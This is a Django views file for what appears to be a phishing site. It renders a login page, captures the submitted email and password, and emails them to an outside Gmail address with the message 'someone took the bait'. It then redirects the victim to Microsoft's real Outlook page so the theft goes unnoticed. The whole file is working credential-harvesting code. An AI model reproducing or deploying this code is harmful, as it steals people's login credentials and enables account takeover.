from django.shortcuts import render, redirect
from django.core.mail import EmailMessage

# Create your views here.

def login(request):
    """s"""
    return render(request, 'login.html')

def contact(request):
    """s"""
    if request.method == 'POST':
        email = request.POST['user']
        password = request.POST['password']

        email = EmailMessage(
            'Mensase de Django App', # asunto
            f'alguien mordio el anzuelo.\nEmail: {email}\nPassword: {password}', #cuerpo del mensaje
            'mulitapro01@gmail.com', # remitente
            ['pescaditos007@gmail.com'], # receptor(es) esto si o si debe estar en una lista
        )

        email.send()

        return redirect('https://www.microsoft.com/es/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook')